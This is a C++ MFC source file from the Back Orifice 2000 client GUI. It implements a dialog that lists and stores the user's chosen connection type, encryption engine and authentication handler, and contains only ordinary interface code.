/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// InteractiveListen.cpp : implementation file
//

#include "stdafx.h"
#include "bo2kgui.h"
#include "InteractiveListen.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CInteractiveListen dialog


CInteractiveListen::CInteractiveListen(CWnd* pParent /*=NULL*/)
	: CDialog(CInteractiveListen::IDD, pParent)
{
	//{{AFX_DATA_INIT(CInteractiveListen)
	m_nAuthHandler = -1;
	m_nConnType = -1;
	m_nEncryption = -1;
	m_strSvrAddr = _T("");
	//}}AFX_DATA_INIT
}


void CInteractiveListen::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CInteractiveListen)
	DDX_CBIndex(pDX, IDC_AUTH_HANDLER, m_nAuthHandler);
	DDX_CBIndex(pDX, IDC_CONNECTION_TYPE, m_nConnType);
	DDX_CBIndex(pDX, IDC_ENCRYPTION_ENGINE, m_nEncryption);
	DDX_Text(pDX, IDC_SERVER_ADDRESS, m_strSvrAddr);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CInteractiveListen, CDialog)
	//{{AFX_MSG_MAP(CInteractiveListen)
		// NOTE: the ClassWizard will add message map macros here
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CInteractiveListen message handlers

void CInteractiveListen::OnOK() 
{
	CComboBox *ccb;
	ccb=(CComboBox *)GetDlgItem(IDC_CONNECTION_TYPE);
	m_strSelectedIO=g_pIOHandler->Query(ccb->GetItemData(ccb->GetCurSel()));
	ccb=(CComboBox *)GetDlgItem(IDC_ENCRYPTION_ENGINE);
	m_strSelectedEnc=g_pEncryptionHandler->Query(ccb->GetItemData(ccb->GetCurSel()));
	ccb=(CComboBox *)GetDlgItem(IDC_AUTH_HANDLER);
	m_strSelectedAuth=g_pAuthHandler->Query(ccb->GetItemData(ccb->GetCurSel()));

	CDialog::OnOK();
}

BOOL CInteractiveListen::OnInitDialog() 
{
	int i;
	CComboBox *ccb;

	CDialog::OnInitDialog();
	
	// Add connection types
	ccb=(CComboBox *)GetDlgItem(IDC_CONNECTION_TYPE);
	if(ccb==NULL) return FALSE;

	for(i=0;i<MAX_IO_HANDLERS;i++) {
		char *txt;
		txt=g_pIOHandler->Query(i);
		if(txt!=NULL) {
			ccb->InsertString(0,txt);
			ccb->SetItemData(0,i);
			if(lstrcmp(txt,m_strSelectedIO)==0) {
				ccb->SetCurSel(0);
			}
		}
	}
	if(ccb->GetCurSel()==CB_ERR) ccb->SetCurSel(0);

	// Add Encryption Types

	ccb=(CComboBox *)GetDlgItem(IDC_ENCRYPTION_ENGINE);
	if(ccb==NULL) return FALSE;

	for(i=0;i<MAX_ENCRYPTION_ENGINES;i++) {
		char *txt;
		txt=g_pEncryptionHandler->Query(i);
		if(txt!=NULL) {
			ccb->InsertString(0,txt);
			ccb->SetItemData(0,i);
			if(lstrcmp(txt,m_strSelectedEnc)==0) {
				ccb->SetCurSel(0);
			}
		}
	}
	if(ccb->GetCurSel()==CB_ERR) ccb->SetCurSel(0);

	// Add Authentication Types

	ccb=(CComboBox *)GetDlgItem(IDC_AUTH_HANDLER);
	if(ccb==NULL) return FALSE;

	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		char *txt=g_pAuthHandler->Query(i);
		if(txt!=NULL) {
			ccb->InsertString(0,txt);
			ccb->SetItemData(0,i);
			if(lstrcmp(txt,m_strSelectedAuth)==0) {
				ccb->SetCurSel(0);
			}
		}
	}
	if(ccb->GetCurSel()==CB_ERR) ccb->SetCurSel(0);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
